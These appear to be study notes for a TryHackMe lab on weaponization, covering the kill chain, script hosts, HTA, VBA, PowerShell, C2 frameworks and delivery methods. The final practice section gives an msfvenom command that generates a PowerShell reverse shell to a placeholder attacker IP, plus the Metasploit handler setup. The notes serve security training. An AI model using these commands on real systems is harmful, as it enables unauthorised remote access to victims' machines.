# Room
https://tryhackme.com/room/weaponization

# Task 1 - intro
* weaponization is the second stage of the cyber kill chain model
* the attacker generates and develops their own malicious code using deliverable payloads
* resources
    * red team toolkit : https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development

# Task 2 - deploy VM
deploy VM

# Task 3 - windows script host
* a windows native engine that is builtin to Windows

# Task 4 - html application - hta
* dynamic HTML pages that contain jscript and vbscript

# Task 5 - vba
* a programming language by microsoft implemented for microsoft applications like word, excel, and powerpoint

# Task 6 - powershell
* object orientated programming language in shell form

# Task 7 - command and control - c2
* popular c2 frameworks
    * cobalt strike
    * powershell empire
    * metasploit

# Task 8 - delivery techniques
* email
* web
* usb

# Task 9 - practice
* created a powershell payload
    * msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=[attacker_ip] LPORT=[attacker_port] > out.ps1
* created a meterpreter handler
    * msfconsole
    * use multi/handler
    * set payload windows/powershell_reverse_tcp
    * set lhost eth0
    * set lport [attacker_port]
    * run
* uploaded malicious payload to target and waited for execution